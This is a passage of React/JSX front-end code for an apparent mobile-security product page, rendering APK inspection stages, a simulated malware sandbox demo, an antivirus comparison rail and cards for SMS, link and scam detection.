                        <div className="hidden sm:block absolute top-1/2 left-0 right-0 h-0.5 bg-white/10 -translate-y-1/2 z-0" />
                        <div 
                          className="hidden sm:block absolute top-1/2 left-0 h-0.5 bg-gradient-to-r from-accent-teal to-accent-purple -translate-y-1/2 z-0 transition-all duration-500"
                          style={{ width: `${(horizontalStep / 4) * 100}%` }}
                        />
                        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 relative z-10">
                          {appHorizontalStages.map((stage, idx) => {
                            const isCurrent = horizontalStep === idx;
                            const isPassed = idx < horizontalStep;
                            const StageIcon = stage.icon;
                            return (
                              <button
                                key={stage.id}
                                onClick={() => setHorizontalStep(idx)}
                                className={`p-2.5 sm:p-3 rounded-2xl text-left transition-all duration-300 border cursor-pointer ${
                                  isCurrent
                                    ? 'bg-black/90 border-accent-teal shadow-lg shadow-accent-teal/20 scale-[1.02]'
                                    : isPassed
                                    ? 'bg-black/40 border-white/20 text-white/80 hover:border-white/40'
                                    : 'bg-black/20 border-white/5 text-white/40 hover:border-white/20'
                                }`}
                              >
                                <div className="flex items-center justify-between mb-1">
                                  <span className={`text-[10px] font-mono font-bold ${isCurrent ? 'text-accent-teal' : 'text-white/40'}`}>
                                    {stage.stepNumber}.
                                  </span>
                                  <StageIcon className={`w-3.5 h-3.5 ${isCurrent ? stage.accentColor : 'text-white/30'}`} />
                                </div>
                                <span className={`text-xs font-bold block truncate ${isCurrent ? 'text-white' : 'text-white/70'}`}>
                                  {stage.category}
                                </span>
                                <span className="text-[10px] text-white/40 block truncate">
                                  {stage.phaseName.replace('PHASE ', '')}
                                </span>
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      {/* Active Stage Horizontal Showcase Card */}
                      <div className="bg-black/70 rounded-2xl border border-white/15 p-4 sm:p-6 shadow-2xl relative overflow-hidden">
                        <div className="absolute top-0 right-0 w-72 h-72 bg-accent-teal/5 rounded-full blur-3xl pointer-events-none" />

                        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
                          
                          {/* Stage Left: Description & Metrics */}
                          <div className="lg:col-span-7 space-y-4">
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className={`text-xs font-mono font-bold px-2.5 py-0.5 rounded-full border ${appHorizontalStages[horizontalStep].badgeBg}`}>
                                {appHorizontalStages[horizontalStep].phaseName}
                              </span>
                              <span className="text-xs text-white/40 font-mono">
                                Category: {appHorizontalStages[horizontalStep].category}
                              </span>
                            </div>

                            <div>
                              <h4 className="text-lg sm:text-xl font-black text-white flex items-center gap-2">
                                {React.createElement(appHorizontalStages[horizontalStep].icon, {
                                  className: `w-5 h-5 ${appHorizontalStages[horizontalStep].accentColor}`
                                })}
                                {appHorizontalStages[horizontalStep].title}
                              </h4>
                              <p className="text-xs sm:text-sm text-white/70 mt-2 leading-relaxed">
                                {appHorizontalStages[horizontalStep].summary}
                              </p>
                            </div>

                            {/* Metrics Strip */}
                            <div className="grid grid-cols-3 gap-2 pt-1">
                              {appHorizontalStages[horizontalStep].metrics.map((m, i) => (
                                <div key={i} className="p-2.5 rounded-xl bg-white/5 border border-white/10">
                                  <span className="text-[10px] text-white/50 block font-mono truncate">{m.label}</span>
                                  <span className="text-xs sm:text-sm font-bold text-white font-mono block mt-0.5 truncate">
                                    {m.value}
                                  </span>
                                </div>
                              ))}
                            </div>

                            {/* Critical Security Checkpoints */}
                            <div className="pt-2 space-y-1.5">
                              <span className="text-[11px] font-mono font-bold text-white/60 uppercase block">
                                Key Threat Vectors Audited in This Phase:
                              </span>
                              <div className="space-y-1">
                                {appHorizontalStages[horizontalStep].checks.map((chk, i) => (
                                  <div key={i} className="flex items-center gap-2 text-xs text-white/70">
                                    <CheckCircle2 className="w-3.5 h-3.5 text-accent-teal shrink-0" />
                                    <span>{chk}</span>
                                  </div>
                                ))}
                              </div>
                            </div>
                          </div>

                          {/* Stage Right: Real-time Terminal Telemetry Stream */}
                          <div className="lg:col-span-5 space-y-3">
                            <div className="flex items-center justify-between text-xs font-mono text-white/50">
                              <span className="flex items-center gap-1.5">
                                <Terminal className="w-3.5 h-3.5 text-accent-teal" />
                                Live Engine Stream
                              </span>
                              <span className="text-emerald-400 text-[10px] flex items-center gap-1">
                                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                                SANDBOX_ACTIVE
                              </span>
                            </div>

                            <div className="p-3.5 rounded-xl bg-black/90 border border-white/15 font-mono text-[11px] leading-relaxed text-white/80 shadow-inner">
                              <pre className="whitespace-pre-wrap text-accent-teal/90 font-mono">
                                {appHorizontalStages[horizontalStep].terminalLog}
                              </pre>
                            </div>

                            <div className="p-3 rounded-xl bg-white/5 border border-white/10 flex items-center justify-between text-xs">
                              <div>
                                <span className="text-[10px] text-white/40 block font-mono">Simulated Target</span>
                                <span className="font-bold text-white font-mono text-xs">{presets[activeSimPreset].name}</span>
                              </div>
                              <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded border ${presets[activeSimPreset].borderColor} ${presets[activeSimPreset].bgGlow} ${presets[activeSimPreset].color}`}>
                                Threat Score: {presets[activeSimPreset].score}/100
                              </span>
                            </div>
                          </div>

                        </div>
                      </div>

                      {/* Horizontal Interactive Preset Simulator Bar */}
                      <div className="p-4 rounded-2xl bg-black/40 border border-white/10 space-y-3">
                        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2">
                          <span className="text-xs font-mono font-bold text-white/70 uppercase flex items-center gap-1.5">
                            <Activity className="w-3.5 h-3.5 text-accent-teal" />
                            Select Live Mobile Threat Preset to Test Across Horizontal Pipeline:
                          </span>
                          <span className="text-[10px] font-mono text-white/40">
                            Click preset to test inspection behavior
                          </span>
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                          {(Object.keys(presets) as Array<keyof typeof presets>).map((key) => {
                            const p = presets[key];
                            const isSel = activeSimPreset === key;
                            return (
                              <button
                                key={key}
                                onClick={() => setActiveSimPreset(key)}
                                className={`p-3 rounded-xl text-left transition-all border cursor-pointer ${
                                  isSel
                                    ? `bg-white/10 ${p.borderColor} shadow-md`
                                    : 'bg-white/5 border-white/5 hover:border-white/20'
                                }`}
                              >
                                <div className="flex items-center justify-between mb-1">
                                  <span className="text-xs font-bold text-white block truncate">{p.name}</span>
                                  <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded ${p.bgGlow} ${p.color}`}>
                                    {p.score}/100
                                  </span>
                                </div>
                                <span className="text-[10px] font-mono text-accent-teal block mb-1">
                                  {p.label}
                                </span>
                                <p className="text-[11px] text-white/50 line-clamp-2">
                                  {p.description}
                                </p>
                              </button>
                            );
                          })}
                        </div>
                      </div>
                    </div>
                  )}

                  {/* LENS 2: Horizontal APK Anatomy Dissector (6 Core Layers) */}
                  {appHorizontalLens === 'anatomy' && (
                    <div className="space-y-6">
                      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 bg-black/40 p-3 rounded-2xl border border-white/10">
                        <div>
                          <span className="text-xs font-mono font-bold text-accent-teal uppercase block">
                            6 Core Architectural Binary Layers of Android APKs
                          </span>
                          <p className="text-xs text-white/50 mt-0.5">
                            Click any layer below to inspect decompiled bytecode, manifest headers, and security auditing vectors.
                          </p>
                        </div>
                        <span className="text-[10px] font-mono px-2.5 py-1 rounded-full bg-accent-teal/15 text-accent-teal border border-accent-teal/30 shrink-0">
                          Layer {selectedAnatomyLayer + 1} of 6 Selected
                        </span>
                      </div>

                      {/* Horizontal 6-Layer Selector Rail */}
                      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
                        {anatomyLayers.map((layer, idx) => {
                          const isSel = selectedAnatomyLayer === idx;
                          const LayerIcon = layer.icon;
                          return (
                            <button
                              key={layer.layer}
                              onClick={() => setSelectedAnatomyLayer(idx)}
                              className={`p-3 rounded-2xl text-left transition-all border cursor-pointer ${
                                isSel
                                  ? 'bg-black/90 border-accent-teal shadow-xl shadow-accent-teal/20 scale-[1.03]'
                                  : 'bg-black/30 border-white/10 hover:border-white/20 text-white/70 hover:text-white'
                              }`}
                            >
                              <div className="flex items-center justify-between mb-1.5">
                                <span className={`text-[10px] font-mono font-bold ${isSel ? 'text-accent-teal' : 'text-white/40'}`}>
                                  0{idx + 1}
                                </span>
                                <LayerIcon className={`w-4 h-4 ${isSel ? 'text-accent-teal' : 'text-white/40'}`} />
                              </div>
                              <span className={`text-xs font-bold block truncate font-mono ${isSel ? 'text-white' : 'text-white/80'}`}>
                                {layer.layer.split(' ')[0]}
                              </span>
                              <span className="text-[10px] text-white/40 block truncate mt-0.5">
                                {layer.label}
                              </span>
                            </button>
                          );
                        })}
                      </div>

                      {/* Active Layer Deep Inspection Showcase */}
                      <div className="bg-black/80 rounded-2xl border border-white/15 p-5 sm:p-6 shadow-2xl relative overflow-hidden">
                        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
                          
                          {/* Layer Left Details */}
                          <div className="lg:col-span-6 space-y-4">
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className="text-xs font-mono font-bold px-2.5 py-0.5 rounded-full bg-accent-teal/15 text-accent-teal border border-accent-teal/30">
                                {anatomyLayers[selectedAnatomyLayer].role}
                              </span>
                              <span className={`text-xs font-mono font-bold px-2 py-0.5 rounded border ${anatomyLayers[selectedAnatomyLayer].riskColor}`}>
                                Risk Level: {anatomyLayers[selectedAnatomyLayer].riskLevel}
                              </span>
                            </div>

                            <div>
                              <h4 className="text-lg font-black text-white flex items-center gap-2 font-mono">
                                {React.createElement(anatomyLayers[selectedAnatomyLayer].icon, {
                                  className: 'w-5 h-5 text-accent-teal'
                                })}
                                {anatomyLayers[selectedAnatomyLayer].layer}
                              </h4>
                              <p className="text-xs sm:text-sm text-white/70 mt-2 leading-relaxed">
                                {anatomyLayers[selectedAnatomyLayer].description}
                              </p>
                            </div>

                            <div className="space-y-2 pt-1">
                              <span className="text-[11px] font-mono font-bold text-white/60 uppercase block">
                                Reverse-Engineering Checkpoints:
                              </span>
                              <div className="space-y-1.5">
                                {anatomyLayers[selectedAnatomyLayer].inspectedChecks.map((chk, i) => (
                                  <div key={i} className="flex items-start gap-2 text-xs text-white/80">
                                    <CheckCircle2 className="w-3.5 h-3.5 text-accent-teal shrink-0 mt-0.5" />
                                    <span>{chk}</span>
                                  </div>
                                ))}
                              </div>
                            </div>
                          </div>

                          {/* Layer Right Decompiled Snippet Preview */}
                          <div className="lg:col-span-6 space-y-2.5">
                            <div className="flex items-center justify-between text-xs font-mono text-white/50">
                              <span className="flex items-center gap-1.5">
                                <Terminal className="w-3.5 h-3.5 text-accent-teal" />
                                Decompiled Binary Preview
                              </span>
                              <span className="text-[10px] text-accent-teal font-mono bg-accent-teal/10 px-2 py-0.5 rounded border border-accent-teal/20">
                                READ-ONLY SNIPPET
                              </span>
                            </div>

                            <div className="p-4 rounded-xl bg-slate-950 border border-white/15 font-mono text-[11px] text-accent-teal/90 shadow-inner overflow-x-auto max-h-[260px] scrollbar-thin">
                              <pre className="whitespace-pre font-mono leading-relaxed">
                                {anatomyLayers[selectedAnatomyLayer].decompiledPreview}
                              </pre>
                            </div>

                            <div className="p-2.5 rounded-xl bg-white/5 border border-white/10 flex items-center justify-between text-[11px] font-mono text-white/60">
                              <span>Security Impact: Severe overlay & bytecode exfiltration vulnerability</span>
                              <span className="text-accent-red font-bold">100% Intercepted</span>
                            </div>
                          </div>

                        </div>
                      </div>
                    </div>
                  )}

                  {/* LENS 3: Live In-Place Horizontal Sandbox Simulator */}
                  {appHorizontalLens === 'simulator' && (
                    <div className="space-y-6">
                      <div className="bg-black/40 p-4 rounded-2xl border border-white/10 space-y-3">
                        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2">
                          <div>
                            <span className="text-xs font-mono font-bold text-accent-teal uppercase block">
                              In-Place Mobile Malware Detonator & Behavioral Sandbox
                            </span>
                            <p className="text-xs text-white/60 mt-0.5">
                              Pick a real-world in-the-wild Indian threat sample and detonate it live inside our isolated browser sandbox.
                            </p>
                          </div>
                          <span className="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/30">
                            Safe Virtual Machine
                          </span>
                        </div>

                        {/* Sample Selection Buttons */}
                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2.5">
                          {(Object.keys(simSamples) as Array<keyof typeof simSamples>).map((k) => {
                            const smp = simSamples[k];
                            const isCur = simSelectedSample === k;
                            return (
                              <button
                                key={k}
                                onClick={() => {
                                  setSimSelectedSample(k);
                                  setSimCompleted(false);
                                  setSimProgress(0);
                                  setSimCurrentPhase('Ready to detonate');
                                }}
                                className={`p-3 rounded-xl text-left transition-all border cursor-pointer ${
                                  isCur
                                    ? 'bg-white/10 border-accent-teal shadow-lg shadow-accent-teal/15'
                                    : 'bg-white/5 border-white/5 hover:border-white/15'
                                }`}
                              >
                                <div className="flex items-center justify-between mb-1">
                                  <span className="text-xs font-bold text-white block truncate">{smp.name.split('_')[0]}</span>
                                  <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded border ${smp.badgeColor}`}>
                                    {smp.threatScore}/100
                                  </span>
                                </div>
                                <span className="text-[10px] text-accent-teal font-mono block truncate">
                                  {smp.family.split('.')[1] || smp.family}
                                </span>
                              </button>
                            );
                          })}
                        </div>
                      </div>

                      {/* Interactive Detonation Execution Banner */}
                      <div className="bg-black/80 rounded-2xl border border-white/15 p-5 sm:p-6 shadow-2xl space-y-5">
                        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                          <div>
                            <span className="text-[10px] font-mono uppercase tracking-wider text-accent-teal bg-accent-teal/10 px-2 py-0.5 rounded border border-accent-teal/20">
                              Selected Binary
                            </span>
                            <h4 className="text-base sm:text-lg font-black text-white mt-1 font-mono">
                              {simSamples[simSelectedSample].name}
                            </h4>
                            <p className="text-xs text-white/60 mt-1 max-w-xl">
                              {simSamples[simSelectedSample].tactics}
                            </p>
                          </div>

                          <Button
                            glow
                            onClick={handleRunSimulator}
                            disabled={simIsRunning}
                            className="text-xs font-bold shrink-0 w-full sm:w-auto"
                          >
                            {simIsRunning ? (
                              <>
                                <RefreshCw className="w-3.5 h-3.5 mr-1.5 animate-spin" />
                                Detonating Sandbox...
                              </>
                            ) : (
                              <>
                                <Play className="w-3.5 h-3.5 mr-1.5" />
                                Run Horizontal Sandbox Demo
                              </>
                            )}
                          </Button>
                        </div>

                        {/* Animated Horizontal Stepper / Progress Rail */}
                        <div className="space-y-2 pt-2">
                          <div className="flex items-center justify-between text-xs font-mono">
                            <span className="text-accent-teal font-bold flex items-center gap-1.5">
                              {simIsRunning && <span className="w-2 h-2 rounded-full bg-accent-teal animate-ping" />}
                              {simCurrentPhase}
                            </span>
                            <span className="text-white/60 font-bold">{simProgress}%</span>
                          </div>

                          <div className="w-full h-2 rounded-full bg-white/10 overflow-hidden relative">
                            <div
                              className="h-full bg-gradient-to-r from-accent-teal via-accent-purple to-accent-teal transition-all duration-300"
                              style={{ width: `${simProgress}%` }}
                            />
                          </div>
                        </div>

                        {/* Post-Detonation Forensic Breakdown */}
                        {simCompleted && (
                          <motion.div
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            className="mt-4 p-4 rounded-xl bg-slate-900/90 border border-accent-teal/40 space-y-4"
                          >
                            <div className="flex items-center justify-between flex-wrap gap-2 pb-3 border-b border-white/10">
                              <div className="flex items-center gap-2">
                                <ShieldCheck className="w-5 h-5 text-accent-teal" />
                                <span className="text-sm font-bold text-white font-mono">
                                  Forensic Verdict: {simSamples[simSelectedSample].riskClass}
                                </span>
                              </div>
                              <span className={`text-xs font-mono font-bold px-2.5 py-0.5 rounded border ${simSamples[simSelectedSample].badgeColor}`}>
                                Threat Score: {simSamples[simSelectedSample].threatScore} / 100
                              </span>
                            </div>

                            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs">
                              <div className="p-3 rounded-lg bg-black/40 border border-white/5">
                                <span className="text-[10px] text-white/40 font-mono block">C2 Command Server IP:</span>
                                <span className="font-mono text-accent-red font-bold mt-1 block truncate">
                                  {simSamples[simSelectedSample].iocIp}
                                </span>
                              </div>
                              <div className="p-3 rounded-lg bg-black/40 border border-white/5">
                                <span className="text-[10px] text-white/40 font-mono block">Dangerous Permissions Flagged:</span>
                                <div className="flex flex-wrap gap-1 mt-1">
                                  {simSamples[simSelectedSample].iocPerms.map((p, i) => (
                                    <span key={i} className="text-[9px] font-mono px-1.5 py-0.5 rounded bg-white/10 text-white/80">
                                      {p}
                                    </span>
                                  ))}
                                </div>
                              </div>
                              <div className="p-3 rounded-lg bg-black/40 border border-white/5">
                                <span className="text-[10px] text-white/40 font-mono block">SHA-256 Checksum:</span>
                                <span className="font-mono text-white/70 text-[10px] mt-1 block truncate">
                                  {simSamples[simSelectedSample].hash}
                                </span>
                              </div>
                            </div>

                            <div className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-xs">
                              <span className="font-mono font-bold text-emerald-400 block mb-0.5">
                                Immediate Remediation Recommendation:
                              </span>
                              <p className="text-white/80">
                                {simSamples[simSelectedSample].recommendation}
                              </p>
                            </div>
                          </motion.div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* LENS 4: Horizontal Threat Comparison Rail (AV vs CyberShield) */}
                  {appHorizontalLens === 'comparison' && (
                    <div className="space-y-4">
                      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2 bg-black/40 p-3 rounded-2xl border border-white/10">
                        <div>
                          <span className="text-xs font-mono font-bold text-accent-teal uppercase block">
                            CyberShield Deep Sandbox vs Traditional Antivirus
                          </span>
                          <p className="text-xs text-white/50 mt-0.5">
                            Comparison rail across 6 critical mobile attack vectors where traditional virus scanners fail.
                          </p>
                        </div>
                        <span className="text-[10px] font-mono px-2.5 py-1 rounded-full bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 shrink-0">
                          6 / 6 Detection Vectors Superior
                        </span>
                      </div>

                      {/* Horizontal Comparison Table / Rail */}
                      <div className="space-y-2.5">
                        {avComparisonData.map((item, idx) => (
                          <div
                            key={idx}
                            className="p-4 rounded-2xl bg-black/70 border border-white/10 hover:border-accent-teal/30 transition-all space-y-3"
                          >
                            <div className="flex items-center justify-between flex-wrap gap-2">
                              <h5 className="text-xs sm:text-sm font-bold text-white flex items-center gap-2">
                                <span className="text-[10px] font-mono text-accent-teal font-bold px-1.5 py-0.5 rounded bg-accent-teal/10 border border-accent-teal/20">
                                  0{idx + 1}
                                </span>
                                {item.feature}
                              </h5>
                              <span className="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/30">
                                {item.advantage}
                              </span>
                            </div>

                            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs font-mono">
                              <div className="p-3 rounded-xl bg-accent-red/5 border border-accent-red/20 text-white/70">
                                <span className="text-[10px] text-accent-red font-bold uppercase tracking-wider block mb-1">
                                  Traditional Antivirus:
                                </span>
                                <p className="text-[11px] leading-relaxed text-white/60">
                                  {item.traditional}
                                </p>
                              </div>

                              <div className="p-3 rounded-xl bg-accent-teal/10 border border-accent-teal/30 text-white">
                                <span className="text-[10px] text-accent-teal font-bold uppercase tracking-wider block mb-1">
                                  CyberShield Deep Sandboxing:
                                </span>
                                <p className="text-[11px] leading-relaxed text-accent-teal/90">
                                  {item.cybershield}
                                </p>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Horizontal Capabilities & Action Bar */}
                  <div className="pt-2 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 text-xs border-t border-white/10">
                    <div className="flex flex-wrap items-center gap-1.5 text-[10px] font-mono text-white/60">
                      <span className="text-white/40">Supported Binaries:</span>
                      <span className="px-2 py-0.5 rounded bg-white/5 border border-white/10 text-accent-teal">Android APK / XAPK</span>
                      <span className="px-2 py-0.5 rounded bg-white/5 border border-white/10 text-purple-400">Windows EXE / DLL</span>
                      <span className="px-2 py-0.5 rounded bg-white/5 border border-white/10 text-blue-400">macOS DMG</span>
                      <span className="px-2 py-0.5 rounded bg-white/5 border border-white/10 text-amber-300">Accessibility Overlays</span>
                      <span className="px-2 py-0.5 rounded bg-white/5 border border-white/10 text-white/70">Zero Log Retention</span>
                    </div>

                    <div className="flex items-center gap-3 shrink-0">
                      {onOpenChat && (
                        <button
                          onClick={onOpenChat}
                          className="text-white/60 hover:text-white font-mono text-xs underline cursor-pointer"
                        >
                          Ask CyberBot about APKs
                        </button>
                      )}
                      <Button size="sm" glow onClick={onStartScan} className="text-xs font-bold">
                        Launch Live App Scanner
                        <ArrowRight className="ml-1.5 w-4 h-4" />
                      </Button>
                    </div>
                  </div>

                </div>
              </motion.div>
            )}

            {selectedFeature === 'sentinel' && (
              <motion.div
                key="feature-sentinel"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="p-6 sm:p-8 rounded-3xl bg-gradient-to-r from-accent-red/15 via-slate-900/90 to-amber-500/15 border-2 border-accent-red/40 shadow-2xl relative overflow-hidden backdrop-blur-xl"
              >
                <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-accent-red via-amber-400 to-accent-red animate-pulse" />

                <div className="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-6">
                  <div className="lg:max-w-sm shrink-0 space-y-3">
                    <div className="flex items-center gap-3">
                      <div className="p-3 bg-accent-red/20 text-accent-red rounded-2xl border border-accent-red/40 shadow-lg shadow-accent-red/15 animate-pulse">
                        <BellRing className="w-7 h-7" />
                      </div>
                      <div>
                        <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-accent-red bg-accent-red/15 px-2 py-0.5 rounded border border-accent-red/30">
                          REAL-TIME SENTINEL
                        </span>
                        <h3 className="text-xl sm:text-2xl font-black text-white mt-1">
                          Scam Sentinel & SMS
                        </h3>
                      </div>
                    </div>
                    <p className="text-xs sm:text-sm text-white/70 leading-relaxed">
                      Instant audio siren and widescreen notification banners for intercepted WhatsApp messages, impersonation texts, and smishing attacks.
                    </p>
                    <div className="pt-1">
                      <Button size="sm" glow onClick={onStartScan} className="text-xs">
                        Open Sentinel Console
                        <ArrowRight className="ml-1.5 w-4 h-4" />
                      </Button>
                    </div>
                  </div>

                  <div className="flex-1 min-w-0 bg-black/50 p-4 sm:p-5 rounded-2xl border border-white/10 space-y-3">
                    <div className="flex items-center justify-between text-xs">
                      <span className="font-bold text-white/70 uppercase tracking-wider font-mono">
                        Horizontal Defense Pipeline
                      </span>
                      <span className="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded-full border border-emerald-500/20">
                        Incoming Notification → AI Risk Assessment → Fast Alert Ribbon
                      </span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                      <div className="p-3 rounded-xl bg-white/5 border border-white/5 space-y-1">
                        <div className="flex items-center justify-between text-[10px] font-mono text-emerald-400">
                          <span>01. DETECT</span>
                          <Smartphone className="w-3.5 h-3.5" />
                        </div>
                        <h4 className="text-xs font-bold text-white">Fake "Hi Mum" / Job Influx</h4>
                        <p className="text-[11px] text-white/50">Flags urgent bank transfers & Telegram job lures.</p>
                      </div>

                      <div className="p-3 rounded-xl bg-white/5 border border-white/5 space-y-1">
                        <div className="flex items-center justify-between text-[10px] font-mono text-amber-400">
                          <span>02. SIREN</span>
                          <AlertTriangle className="w-3.5 h-3.5" />
                        </div>
                        <h4 className="text-xs font-bold text-white">Fast Audio Warning</h4>
                        <p className="text-[11px] text-white/50">High-priority warning beeps wake users before money moves.</p>
                      </div>

                      <div className="p-3 rounded-xl bg-white/5 border border-white/5 space-y-1">
                        <div className="flex items-center justify-between text-[10px] font-mono text-accent-red">
                          <span>03. QUARANTINE</span>
                          <Shield className="w-3.5 h-3.5" />
                        </div>
                        <h4 className="text-xs font-bold text-white">Scammer Dossier & NC3</h4>
                        <p className="text-[11px] text-white/50">Inspect syndicate geo-route & report to global registry.</p>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {selectedFeature === 'message' && (
              <motion.div
                key="feature-message"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="p-6 sm:p-8 rounded-3xl bg-gradient-to-r from-blue-500/15 via-slate-900/90 to-accent-teal/15 border-2 border-blue-400/40 shadow-2xl relative overflow-hidden backdrop-blur-xl"
              >
                <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-blue-400 via-accent-teal to-blue-400" />
                <div className="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-6">
                  <div className="lg:max-w-sm shrink-0 space-y-3">
                    <div className="flex items-center gap-3">
                      <div className="p-3 bg-blue-500/20 text-blue-400 rounded-2xl border border-blue-400/40 shadow-lg">
                        <MessageSquare className="w-7 h-7" />
                      </div>
                      <div>
                        <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-blue-400 bg-blue-500/15 px-2 py-0.5 rounded border border-blue-400/30">
                          SMISHING DEFENSE
                        </span>
                        <h3 className="text-xl sm:text-2xl font-black text-white mt-1">
                          {t.messageScan}
                        </h3>
                      </div>
                    </div>
                    <p className="text-xs sm:text-sm text-white/70 leading-relaxed">
                      Analyze SMS texts, bank KYC suspension threats, and OTP interception tricks with linguistic deception recognition.
                    </p>
                    <div className="pt-1">
                      <Button size="sm" glow onClick={onStartScan} className="text-xs">
                        Analyze Messages
                        <ArrowRight className="ml-1.5 w-4 h-4" />
                      </Button>
                    </div>
                  </div>

                  <div className="flex-1 min-w-0 bg-black/50 p-4 sm:p-5 rounded-2xl border border-white/10 space-y-3">
                    <span className="text-xs font-bold text-white/70 uppercase tracking-wider font-mono">
                      Deception Taxonomy Analyzed
                    </span>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                      <div className="p-3 rounded-xl bg-white/5 border border-white/5">
                        <h4 className="font-bold text-white mb-1">Psychological Pressure Scoring</h4>
                        <p className="text-white/50 text-[11px]">Detects artificial urgency, panic triggers, and fear of account closure.</p>
                      </div>
                      <div className="p-3 rounded-xl bg-white/5 border border-white/5">
                        <h4 className="font-bold text-white mb-1">Sender Masking Verification</h4>
                        <p className="text-white/50 text-[11px]">Identifies spoofed sender IDs matching reputable banks and parcel couriers.</p>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {selectedFeature === 'link' && (
              <motion.div
                key="feature-link"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="p-6 sm:p-8 rounded-3xl bg-gradient-to-r from-purple-500/15 via-slate-900/90 to-accent-teal/15 border-2 border-purple-400/40 shadow-2xl relative overflow-hidden backdrop-blur-xl"
              >
                <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-purple-400 via-accent-teal to-purple-400" />
                <div className="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-6">
                  <div className="lg:max-w-sm shrink-0 space-y-3">
                    <div className="flex items-center gap-3">
                      <div className="p-3 bg-purple-500/20 text-purple-400 rounded-2xl border border-purple-400/40 shadow-lg">
                        <LinkIcon className="w-7 h-7" />
                      </div>
                      <div>
                        <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-purple-400 bg-purple-500/15 px-2 py-0.5 rounded border border-purple-400/30">
                          URL DEFENDER
                        </span>
                        <h3 className="text-xl sm:text-2xl font-black text-white mt-1">
                          {t.linkScan}
                        </h3>
                      </div>
                    </div>
                    <p className="text-xs sm:text-sm text-white/70 leading-relaxed">
                      Real-time homoglyph analysis, typosquatting domain inspection, and zero-day drive-by payload quarantine.
                    </p>
                    <div className="pt-1">
                      <Button size="sm" glow onClick={onStartScan} className="text-xs">
                        Verify URL
                        <ArrowRight className="ml-1.5 w-4 h-4" />
                      </Button>
                    </div>
                  </div>

                  <div className="flex-1 min-w-0 bg-black/50 p-4 sm:p-5 rounded-2xl border border-white/10 space-y-3">
                    <span className="text-xs font-bold text-white/70 uppercase tracking-wider font-mono">
                      Domain Protection Metrics
                    </span>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                      <div className="p-3 rounded-xl bg-white/5 border border-white/5">
                        <h4 className="font-bold text-white mb-1">Cyrillic & Homograph Detection</h4>
                        <p className="text-white/50 text-[11px]">Unmasks spoofed domains replacing ASCII characters with visual lookalikes.</p>
                      </div>
                      <div className="p-3 rounded-xl bg-white/5 border border-white/5">
                        <h4 className="font-bold text-white mb-1">SSL & Redirect Depth Audit</h4>
                        <p className="text-white/50 text-[11px]">Traces multi-hop redirects leading to credential harvesting kits.</p>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {selectedFeature === 'bot' && (
              <motion.div
                key="feature-bot"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="p-6 sm:p-8 rounded-3xl bg-gradient-to-r from-amber-500/15 via-slate-900/90 to-accent-teal/15 border-2 border-amber-400/40 shadow-2xl relative overflow-hidden backdrop-blur-xl"
              >
                <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-amber-400 via-accent-teal to-amber-400" />
                <div className="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-6">
                  <div className="lg:max-w-sm shrink-0 space-y-3">
                    <div className="flex items-center gap-3">
